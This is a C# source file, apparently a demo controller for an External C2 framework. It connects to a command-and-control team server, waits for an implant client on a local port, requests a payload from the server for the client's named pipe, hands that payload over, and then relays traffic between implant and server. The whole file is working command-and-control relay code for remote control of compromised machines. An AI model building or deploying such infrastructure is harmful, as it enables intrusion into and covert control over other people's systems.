using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using ExternalC2.NET.Server;

namespace DemoController;

internal static class Program
{
    public static async Task Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("demo-controller.exe <address> <port>");
            return;
        }

        var target = IPAddress.Parse(args[0]);
        var port = int.Parse(args[1]);

        // connect to the team server
        var controller = new ServerController(target, port);
        if (!await controller.Connect())
        {
            Console.WriteLine($"Failed to connect to {target}:{port}.");
            return;
        }

        // wait for a connection from a client
        var listener = new TcpListener(IPAddress.Loopback, 9999);
        listener.Start(100);

        var client = await listener.AcceptTcpClientAsync();
        
        // stop the listener
        listener.Stop();
        
        // read pipename from client
        var pipename = Encoding.Default.GetString(await client.ReadData());
        
        // request payload
        var payload = await controller.RequestPayload(pipename);
        
        // send it to the client
        await client.WriteData(payload);

        // drop into loop
        while (client.Connected)
        {
            if (client.HasData())
            {
                // read from client
                var inbound = await client.ReadData();
                
                // send it to team server
                await controller.SendData(inbound);
                
                // read data from team server
                var outbound = await controller.ReadData();
                
                // send it to the client
                await client.WriteData(outbound);
            }

            await Task.Delay(100);
        }
        
        controller.Dispose();
    }
}